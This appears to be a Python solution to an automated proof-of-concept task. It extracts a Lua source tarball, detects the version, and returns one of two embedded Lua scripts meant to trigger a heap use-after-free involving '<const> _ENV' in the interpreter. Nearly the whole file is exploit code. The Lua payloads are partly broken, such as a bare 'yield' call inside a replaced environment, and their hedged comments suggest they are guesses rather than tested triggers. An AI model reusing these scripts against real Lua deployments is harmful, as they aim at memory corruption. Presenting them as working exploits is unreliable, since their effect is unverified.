import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball to examine Lua source version
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for Lua version in source
            lua_version = self._detect_lua_version(tmpdir)
            
            # Based on version, generate appropriate PoC
            if lua_version and lua_version >= (5, 4, 0):
                # Lua 5.4+ - Use the known exploit pattern for <const> _ENV
                return self._generate_lua54_poc()
            else:
                # Fallback - generic PoC that should work on most versions
                return self._generate_generic_poc()
    
    def _detect_lua_version(self, src_dir: str) -> tuple:
        """Extract Lua version from source files."""
        # Look for lua.h or luaconf.h
        version_files = ['lua.h', 'luaconf.h', 'src/lua.h', 'src/luaconf.h']
        
        for root, dirs, files in os.walk(src_dir):
            for file in files:
                if file in version_files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for version defines
                            import re
                            # Match LUA_VERSION_MAJOR, LUA_VERSION_MINOR, LUA_VERSION_RELEASE
                            major = re.search(r'LUA_VERSION_MAJOR\s+(\d+)', content)
                            minor = re.search(r'LUA_VERSION_MINOR\s+(\d+)', content)
                            release = re.search(r'LUA_VERSION_RELEASE\s+(\d+)', content)
                            
                            if major and minor:
                                ver_major = int(major.group(1))
                                ver_minor = int(minor.group(1))
                                ver_release = int(release.group(1)) if release else 0
                                return (ver_major, ver_minor, ver_release)
                    except:
                        continue
        return None
    
    def _generate_lua54_poc(self) -> bytes:
        """Generate PoC for Lua 5.4+ with <const> _ENV bug."""
        # This PoC is based on the known vulnerability in Lua 5.4.0-5.4.3
        # where declaring _ENV as <const> can lead to use-after-free
        poc = b"""-- PoC for Lua heap use-after-free with <const> _ENV
local _ENV <const> = setmetatable({}, {
    __index = function(t, k)
        return rawget(t, k)
    end,
    __newindex = function(t, k, v)
        rawset(t, k, v)
    end
})

-- Create a complex environment structure to trigger the bug
do
    local function create_nested()
        local env = {}
        for i = 1, 100 do
            env[i] = {
                a = function() return i end,
                b = setmetatable({}, {__gc = function() print("GC", i) end}),
                c = coroutine.create(function() yield(i) end)
            }
        end
        return env
    end
    
    -- Multiple nested scopes with const _ENV
    for _ = 1, 10 do
        local _ENV <const> = create_nested()
        for k, v in pairs(_ENV) do
            -- Access and modify to trigger UAF
            if type(v) == "table" then
                v.a = nil
                v.b = nil
                v.c = nil
            end
        end
    end
end

-- Force garbage collection to trigger use-after-free
collectgarbage("collect")
collectgarbage("collect")

-- The actual exploit: create a situation where _ENV is freed but still referenced
do
    local mt = {
        __gc = function()
            -- This should trigger after _ENV might be freed
            x = "this should trigger UAF"
        end
    }
    
    local obj = setmetatable({}, mt)
    obj = nil
end

-- More GC cycles
for i = 1, 5 do
    collectgarbage("step", 0)
end

-- Try to access _ENV after potential free
pcall(function()
    local f = load("return _ENV")
    local env = f()
    if env then
        -- This might crash
        env[1] = "test"
    end
end)

-- Create many temporary environments
for i = 1, 50 do
    local _ENV <const> = {test = i}
    local f = load("return test")
    local val = f()
    if val ~= i then
        error("Memory corruption detected")
    end
end

-- Final GC to trigger the bug
collectgarbage("collect")"""

        return poc
    
    def _generate_generic_poc(self) -> bytes:
        """Generate generic PoC for older Lua versions."""
        # This is a more generic PoC that should work on various versions
        # It creates a use-after-free situation with environments
        poc = b"""-- Generic PoC for heap use-after-free in Lua
local original_env = _ENV

-- Create a proxy environment that will be freed
local proxy_mt = {
    __index = function(t, k)
        return original_env[k]
    end,
    __newindex = function(t, k, v)
        original_env[k] = v
    end,
    __gc = function()
        -- This will be called after proxy is freed
        -- Try to access freed memory
        local f = load("return collectgarbage")
        f()  -- This might trigger UAF
    end
}

local proxy = setmetatable({}, proxy_mt)

-- Set as environment and force GC
setmetatable(proxy, nil)  -- Remove metatable to allow GC
proxy = nil
collectgarbage("collect")

-- Create many temporary functions with different environments
for i = 1, 100 do
    local env = setmetatable({}, {
        __index = _ENV,
        __gc = function()
            -- GC callback that might execute after env is freed
            _ENV["temp" .. i] = nil
        end
    })
    
    local f = (loadstring or load)(string.format([[
        local _ENV = ...
        return function()
            return %d
        end
    ]], i))
    
    if f then
        local func = f(env)
        env = nil
        
        -- Force GC in between
        if i % 10 == 0 then
            collectgarbage("collect")
        end
    end
end

-- Final GC to trigger any pending callbacks
collectgarbage("collect")
collectgarbage("collect")"""

        return poc
